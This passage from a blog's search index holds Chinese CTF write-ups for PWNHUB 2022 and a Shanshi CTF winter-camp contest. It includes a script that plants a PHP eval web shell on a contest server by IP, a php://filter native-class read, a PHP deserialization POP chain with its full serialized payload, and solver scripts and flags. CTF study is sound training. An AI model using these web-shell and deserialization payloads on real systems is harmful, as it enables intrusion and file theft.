class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> sys<br><br>BATTLE_NET_KEY = <span class="hljs-string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span> //key<br>data = &#123;<br>    <span class="hljs-string">&quot;from_uid&quot;</span>: <span class="hljs-string">&quot;a.php&quot;</span>,<br>    <span class="hljs-string">&quot;commandFunc&quot;</span>: <span class="hljs-string">&quot;file_put_contents&quot;</span>,<br>    <span class="hljs-string">&quot;content&quot;</span>: <span class="hljs-string">&#x27;&lt;? eval($_POST[&#x27;</span>a<span class="hljs-string">&#x27;]);&#x27;</span>,  //一句话<br>    <span class="hljs-string">&quot;content-encoding&quot;</span>: <span class="hljs-string">&quot;csv&quot;</span><br>&#125;<br>data[<span class="hljs-string">&quot;sign&quot;</span>] = hashlib.md5((data[<span class="hljs-string">&quot;from_uid&quot;</span>]+data[<span class="hljs-string">&quot;commandFunc&quot;</span>]+data[<span class="hljs-string">&quot;content&quot;</span>]+BATTLE_NET_KEY).encode()).hexdigest()<br>t=requests.post(<span class="hljs-string">&quot;http://120.55.42.64:81/server/game/BattleNetGateway.php&quot;</span>, data=data)<br><span class="hljs-built_in">print</span>(t.text)<br></code></pre></td></tr></table></figure><p>蚁剑连接，flag在根目录下<br><img src="/mdimg/2022PWNHUB/5.jpeg"></p><h1 id="PPC"><a href="#PPC" class="headerlink" title="PPC"></a>PPC</h1><h2 id="Tcp-Show"><a href="#Tcp-Show" class="headerlink" title="Tcp Show"></a>Tcp Show</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><br>n = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>())<br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    d, rawdata = <span class="hljs-built_in">input</span>().strip().split()<br>    data = base64.b64decode(rawdata.encode())<br>    now = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">16</span>):<br>        <span class="hljs-keyword">if</span> d == <span class="hljs-string">&#x27;1&#x27;</span>:<br>            now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">8</span><br>        now += <span class="hljs-built_in">hex</span>(i)[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>) + <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                now += <span class="hljs-built_in">hex</span>(data[i + j])[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">3</span><br>        now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                tmp = data[i + j]<br>                <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= tmp &lt;= <span class="hljs-number">126</span>:<br>                    now += <span class="hljs-built_in">chr</span>(tmp)<br>                <span class="hljs-keyword">else</span>:<br>                    now += <span class="hljs-string">&#x27;.&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>        now += <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-built_in">print</span>(now[:-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><h2 id="垃圾邮件分析"><a href="#垃圾邮件分析" class="headerlink" title="垃圾邮件分析"></a>垃圾邮件分析</h2><p>爆破sha256脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-string">&#x27;sha256(vKyd2tRZFtkExhiNlPlVTduEqY47 + xxxx) = 4a39288b21b34650b177bdc58c416b3f55305945a9cf87f4bd7b4da2569c10e4&#x27;</span><br>suffix = data.split(<span class="hljs-string">&quot;(&quot;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot; +&quot;</span>)[<span class="hljs-number">0</span>]<br>digest = data.split(<span class="hljs-string">&quot;= &quot;</span>)[<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> SHA256<br><span class="hljs-keyword">import</span> itertools<br><br>ALPHABET = string.ascii_letters + string.digits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getProof</span>(<span class="hljs-params">suffix,digest</span>):   <br><br>    <span class="hljs-comment">#print(f&quot;suffix: &#123;suffix&#125;\ndigest: &#123;digest&#125;&quot;)</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product(ALPHABET,repeat=<span class="hljs-number">4</span>):<br>        prefix = <span class="hljs-string">&#x27;&#x27;</span>.join(i)<br>        guess =  suffix + prefix<br>        <span class="hljs-keyword">if</span> sha256(guess.encode()).hexdigest() == digest:<br>            <span class="hljs-comment">#print(f&quot;Find X<span class="hljs-doctag">XXX:</span> &#123;prefix&#125;&quot;)</span><br>            <span class="hljs-keyword">return</span> prefix<br>            <span class="hljs-keyword">break</span><br><br>x = getProof(suffix,digest)<br><span class="hljs-built_in">print</span>(x)<br></code></pre></td></tr></table></figure><p>给50条数据来训练AI，然后给10条邮件让判断是垃圾邮件还是好的邮件<br>不会机器学习，纯靠翻译自己去判断，10条全对就拿到flag了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第2届山石CTF冬令营结营赛wp</title>
    <link href="/2023/02/05/%E7%AC%AC2%E5%B1%8A%E5%B1%B1%E7%9F%B3CTF%E5%86%AC%E4%BB%A4%E8%90%A5%E7%BB%93%E8%90%A5%E8%B5%9Bwp/"/>
    <url>/2023/02/05/%E7%AC%AC2%E5%B1%8A%E5%B1%B1%E7%9F%B3CTF%E5%86%AC%E4%BB%A4%E8%90%A5%E7%BB%93%E8%90%A5%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h3 id="Primitive-php"><a href="#Primitive-php" class="headerlink" title="Primitive php"></a>Primitive php</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>highlight_file(__FILE__);<br>//hint.php<br>foreach ($_GET <span class="hljs-keyword">as</span> $value) &#123;<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/flag/&quot;</span>,$value))&#123;<br>        die(<span class="hljs-string">&quot;不可以看flag啦，阿sir&quot;</span>);<br>    &#125;<br><br>&#125;<br>$a = new $_GET[<span class="hljs-string">&#x27;class1&#x27;</span>]($_GET[<span class="hljs-string">&#x27;a&#x27;</span>]);$b = new $_GET[<span class="hljs-string">&#x27;class2&#x27;</span>]($_GET[<span class="hljs-string">&#x27;b&#x27;</span>]);<br><span class="hljs-keyword">if</span> ($a !== $b <span class="hljs-keyword">and</span> md5($a)===md5($b))<br>&#123;<br>    echo new $_GET[<span class="hljs-string">&#x27;class3&#x27;</span>]($_GET[<span class="hljs-string">&#x27;c&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>原生类绕过：参考：<a href="https://blog.csdn.net/qq_63928796/article/details/127786521">https://blog.csdn.net/qq_63928796/article/details/127786521</a><br><code>?class2=Exception&amp;b=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class1=Exception&amp;a=&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&amp;class3=SplFileObject&amp;c=php://filter/convert.base64-encode/resource=hint.php</code><br>filter流伪协议读到源码<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br>echo <span class="hljs-string">&quot;no hint&quot;</span>;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">blue</span><br>&#123;<br>    public $b1;<br>    public $b2;<br><br>    function <span class="hljs-built_in">eval</span>() &#123;<br>        echo new $this-&gt;b1($this-&gt;b2);<br>    &#125;<br><br>    public function __invoke()<br>    &#123;<br>        $this-&gt;b1-&gt;blue();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">red</span><br>&#123;<br>    public $r1;<br><br>    public function __destruct()<br>    &#123;<br>        echo $this-&gt;r1 . <span class="hljs-string">&#x27;0xff0000&#x27;</span>;<br>    &#125;<br><br>    public function execute()<br>    &#123;<br>        ($this-&gt;r1)();<br>    &#125;<br><br>    public function __call($a, $b)<br>    &#123;<br>        echo $this-&gt;r1-&gt;getFlag();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">white</span><br>&#123;<br>    public $w;<br><br>    public function __toString()<br>    &#123;<br>        $this-&gt;w-&gt;execute();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">color</span><br>&#123;<br>    public $c1;<br><br>    public function execute()<br>    &#123;<br>        ($this-&gt;c1)();<br>    &#125;<br><br>    public function getFlag()<br>    &#123;<br>        echo file_get_contents($this-&gt;c1);<br>    &#125;<br><br>&#125;<br><br>unserialize($_POST[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br></code></pre></td></tr></table></figure><p>反序列化构造payload<br>参考：<br><a href="https://blog.csdn.net/cosmoslin/article/details/123829951">https://blog.csdn.net/cosmoslin/article/details/123829951</a><br>构造伪协议读取flag<code>php://filter/convert.base64-encode/resource=flag.php</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;?php<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">blue</span><br>&#123;<br>    public $b1;<br>    public $b2;<br><br>    public function __construct($b1)<br>    &#123;<br>        $this-&gt;b1 = $b1;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">red</span><br>&#123;<br>    public $r1;<br><br>    public function __construct($r1)<br>    &#123;<br>        $this-&gt;r1 = $r1;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">white</span><br>&#123;<br>    public $w;<br><br>    public function __construct($w)<br>    &#123;<br>        $this-&gt;w = $w;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">color</span><br>&#123;<br>    public $c1;<br><br>    public function __construct($c1)<br>    &#123;<br>        $this-&gt;c1 = $c1;<br>    &#125;<br><br>&#125;<br>$f = new color(<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>);  <br>$e = new red($f);<br>$d = new blue($e);<br>$c = new color($d);<br>$b = new white($c);<br>$a = new red($b);<br>echo (urlencode(serialize($a)));<br></code></pre></td></tr></table></figure><p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/2.png"><br><code>unserialize($_POST[&#39;cmd&#39;]);</code>post传参cmd<br>payload：<br><code>cmd=O%3A3%3A%22red%22%3A1%3A%7Bs%3A2%3A%22r1%22%3BO%3A5%3A%22white%22%3A1%3A%7Bs%3A1%3A%22w%22%3BO%3A5%3A%22color%22%3A1%3A%7Bs%3A2%3A%22c1%22%3BO%3A4%3A%22blue%22%3A2%3A%7Bs%3A2%3A%22b1%22%3BO%3A3%3A%22red%22%3A1%3A%7Bs%3A2%3A%22r1%22%3BO%3A5%3A%22color%22%3A1%3A%7Bs%3A2%3A%22c1%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7Ds%3A2%3A%22b2%22%3BN%3B%7D%7D%7D%7D</code><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/3.png"><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/4.png"><br>:::tips<br>HSNCTF{537C532E-408B-FDCD-3E49-58E6FB578579}<br>:::</p><h3 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h3><p>用工具cloakify<br>kali：<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/5.png"><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/6.png"><br>打开保存的文件<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/7.png"><br>改后缀zip<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/8.png"><br>zip套娃，文件名递减1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><br>count = <span class="hljs-number">2331</span><br><span class="hljs-keyword">while</span> count&gt;<span class="hljs-number">0</span>:<br>    path = <span class="hljs-string">&#x27;f&#x27;</span>+ <span class="hljs-built_in">str</span>(count) + <span class="hljs-string">&#x27;.zip&#x27;</span><br>    folder_abs = <span class="hljs-string">&#x27;.&#x27;</span><br><br>    zip_file = zipfile.ZipFile(path)<br>    zip_list = zip_file.namelist()<br><br>    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> zip_list:<br>        zip_file.extract(f, folder_abs)<br>     <br>    zip_file.close()<br>    count -= <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>得到<img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/9.png"><br>:::tips<br>hsnctf{66eec912-e9ce-4e1d-ac54-ecea075dcb96}<br>:::</p><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/10.png"><br>:::tips<br>hsnctf{welcome_to_hsnctf}<br>:::</p><h3 id="外星电波"><a href="#外星电波" class="headerlink" title="外星电波~"></a>外星电波~</h3><p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/11.png"><br>得到一个加密的压缩包<br>NTFS数据流加密<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/12.png"><br>得到音频，导出，sstv读<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/13.png"><br>解压缩包得到flag<br>:::tips<br>hsnctf{70995fb0-eb60-0787-f305-77066aeb6730}<br>:::</p><h3 id="daobudao"><a href="#daobudao" class="headerlink" title="daobudao"></a>daobudao</h3><p><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/14.png"><br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/15.png"><br>:::tips<br>hsnctf{g00d_luck_have_fun}<br>:::</p><h3 id="S7-analysis"><a href="#S7-analysis" class="headerlink" title="S7_analysis"></a>S7_analysis</h3><p>随便翻翻，看见一个stop<br><img src="/mdimg/%E5%B1%B1%E7%9F%B3%E5%86%AC%E4%BB%A4%E8%90%A5/16.png"><br>:::tips<br> hsnctf{399}<br>:::</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
